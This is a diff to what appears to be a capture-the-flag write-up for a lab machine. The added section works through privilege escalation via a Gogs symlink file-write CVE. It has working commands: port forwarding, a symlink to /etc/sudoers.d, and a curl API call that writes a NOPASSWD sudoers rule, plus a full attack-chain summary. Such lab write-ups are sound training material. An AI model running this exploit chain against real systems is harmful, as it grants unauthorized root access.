@@ -199,12 +199,155 @@ Password: F1l3_d0ck3r
 
 ---
 
-## Key Takeaways
+## Phase 5: Privilege Escalation
 
-1. **Staging environments are goldmines** — Always hunt for subdomains and non-production instances
-2. **Token leaks are critical** — Never assume tokens are safely transmitted
-3. **Containers leak secrets** — Environment variables are a common privilege escalation vector
-4. **Chain your exploits** — Individual vulnerabilities may be low-impact, but chained together they compromise systems
+### Local Enumeration
+
+```bash
+ss -tulpn
+```
+
+**Discovery:**
+```
+127.0.0.1:3001 → Gogs (Git service)
+```
+
+**Why this matters:**
+Internal services:
+- Not exposed externally
+- Often less secured
+
+### Access via Port Forwarding
+
+```bash
+ssh -L 3001:127.0.0.1:3001 ben@<TARGET_IP>
+```
+
+### Vulnerability 3: CVE-2025-8110 — Gogs Symlink Arbitrary File Write
+
+**Root Cause:**
+Gogs validates file paths BUT does NOT validate symlink targets.
+
+**Exploit Logic:**
+1. Create symlink → points outside repo
+2. Use API to write to file
+3. Gogs follows symlink → writes to system file
+
+**Why this is powerful:**
+We can overwrite ANY file writable by Gogs → Gogs runs as root
+
+### Exploitation Steps
+
+**1. Create Repo Via UI**
+
+**2. Clone Repo:**
+```bash
+git clone http://127.0.0.1:3001/user1/symlink.git
+```
+
+**3. Create Symlink:**
+```bash
+ln -s /etc/sudoers.d/ben evil
+```
+
+**Why this target?**
+sudoers controls privilege escalation
+
+**4. Push Symlink:**
+```bash
+git add evil
+git commit -m "symlink"
+git push
+```
+
+**5. Generate API Token:**
+From: Settings → Applications
+
+**6. Overwrite sudoers:**
+```bash
+echo "ben ALL=(ALL) NOPASSWD: ALL" | base64
+```
+
+Then:
+```bash
+curl -X PUT http://127.0.0.1:3001/api/v1/repos/user1/symlink/contents/evil \
+  -H "Authorization: token <TOKEN>" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "message": "exploit",
+    "content": "<BASE64>"
+  }'
+```
+
+**Result:** `/etc/sudoers.d/ben` modified
+
+### Root Access
+
+```bash
+sudo -i
+```
+
+---
+
+## 🏁 Full Attack Chain
+
+```
+1.  Nmap → find web service
+2.  Subdomain enumeration → staging environment
+3.  CVE-2025-58434 → password reset token leak
+4.  Account takeover
+5.  CVE-2025-59528 → RCE via CustomMCP
+6.  Container shell
+7.  Extract credentials from environment
+8.  SSH access as ben
+9.  Enumerate internal services
+10. Discover Gogs
+11. CVE-2025-8110 → symlink file write
+12. Overwrite sudoers
+13. sudo → root
+```
+
+---
+
+## 🧠 Key Takeaways
+
+1. **Chain vulnerabilities** — No single exploit = root. Real power is chaining.
+2. **Containers ≠ secure boundary** — Always attempt escape or pivot
+3. **Internal services are gold** — localhost ≠ safe
+4. **API security is critical** — Token leaks, unsafe parsing, poor validation
+5. **Classic bugs still win** — Symlink attacks → still effective
+
+---
+
+## ❌ Common Mistakes
+
+- Ignoring staging subdomain
+- Not checking API endpoints
+- Missing `/proc/1/environ`
+- Forgetting newline in sudoers payload
+- Using wrong Git authentication
+
+---
+
+## 🎯 Real-World Mapping
+
+This machine reflects:
+```
+Dev environment compromise → container breakout → credential reuse → 
+internal tooling abuse → privilege escalation
+```
+
+Seen commonly in:
+- Startups
+- CI/CD pipelines
+- Internal dashboards
+
+---
+
+## 🏆 Final Thought
+
+**Silentium teaches:**
+> *"Enumeration creates opportunity. Chaining creates impact."*
 
 ---
 
@@ -213,7 +356,9 @@ Password: F1l3_d0ck3r
 - `nmap` — Port scanning and service detection
 - `gobuster` — Subdomain enumeration
 - `curl` — API exploitation
-- Standard SSH client — Lateral movement
+- `ss` — Network enumeration
+- `ssh` — Lateral movement and port forwarding
+- `git` — Symlink exploitation
 
 ---
 
